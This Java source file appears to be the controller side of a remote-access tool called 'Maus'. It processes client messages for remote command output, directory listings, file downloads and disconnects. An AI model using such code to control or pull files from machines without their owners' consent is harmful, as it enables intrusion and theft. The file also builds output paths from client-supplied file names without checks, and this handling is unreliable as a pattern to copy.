package Server;

import GUI.Controller;
import GUI.ResizeHelper;
import GUI.Views.FileExplorerView;
import GUI.Views.SendCommandView;
import Logger.Level;
import Logger.Logger;
import Server.Data.PseudoBase;
import Server.Data.Repository;
import javafx.application.Platform;
import javafx.scene.Scene;
import javafx.stage.Stage;
import javafx.stage.StageStyle;

import java.io.*;

class ProcessCommands implements Repository {

    static void processCommands(InputStream is, ClientObject client) throws IOException {
        byte[] buffer = new byte[1024];
        int read;
        while ((read = is.read(buffer)) != -1) {
            String input = new String(buffer, 0, read);
            Logger.log(Level.INFO, "Received Command: " + input);
            if (input.contains("CMD")) {
                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
                DataInputStream dis = new DataInputStream(bis);
                int outputCount = dis.readInt();
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < outputCount; i++) {
                    sb.append(dis.readUTF()).append("\n");
                }
                SendCommandView.getConsole().appendText(sb.toString());
            }
            if (input.contains("FILELIST")) {
                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
                DataInputStream dis = new DataInputStream(bis);
                String pathName = dis.readUTF();
                int filesCount = dis.readInt();
                String[] fileNames = new String[filesCount];
                for (int i = 0; i < filesCount; i++) {
                    fileNames[i] = dis.readUTF();
                }
                dis.close();
                Platform.runLater(() -> {
                    Stage stage = new Stage();
                    stage.setMinWidth(400);
                    stage.setMinHeight(400);
                    stage.initStyle(StageStyle.UNDECORATED);
                    stage.setScene(new Scene(FileExplorerView.getFileExplorerView(pathName, fileNames, stage, client), 900, 500));
                    ResizeHelper.addResizeListener(stage);
                    stage.show();
                });
            }
            if (input.contains("DOWNLOAD")) {
                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
                DataInputStream dis = new DataInputStream(bis);
                String saveDirectory = dis.readUTF();

                long fileLength = dis.readLong();
                String fileName = dis.readUTF();

                File downloadedFile = new File(saveDirectory + "/" + fileName);
                FileOutputStream fos = new FileOutputStream(downloadedFile);
                BufferedOutputStream bos = new BufferedOutputStream(fos);

                for (int j = 0; j < fileLength; j++) bos.write(bis.read());

                bos.close();
                dis.close();
            }
            if (input.contains("FILES")) {
                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
                DataInputStream dis = new DataInputStream(bis);
                int filesCount = dis.readInt();
                File[] files = new File[filesCount];
                for (int i = 0; i < filesCount; i++) {
                    long fileLength = dis.readLong();
                    String fileName = dis.readUTF();

                    files[i] = new File("C:/Users/caden/Desktop/DIDITWORK" + "/" + fileName);

                    FileOutputStream fos = new FileOutputStream(files[i]);
                    BufferedOutputStream bos = new BufferedOutputStream(fos);

                    for (int j = 0; j < fileLength; j++) bos.write(bis.read());
                    bos.close();
                }
                dis.close();
            }
            /* Uninstall and close remote server - remove from Maus */
            if (input.contains("EXIT")) {
                PseudoBase.getMausData().remove(client.getIP());
                CONNECTIONS.remove(client.getIP());
                Controller.updateStats();
                Controller.updateTable();
                client.getClient().close();
                break;
            }
        }
    }
}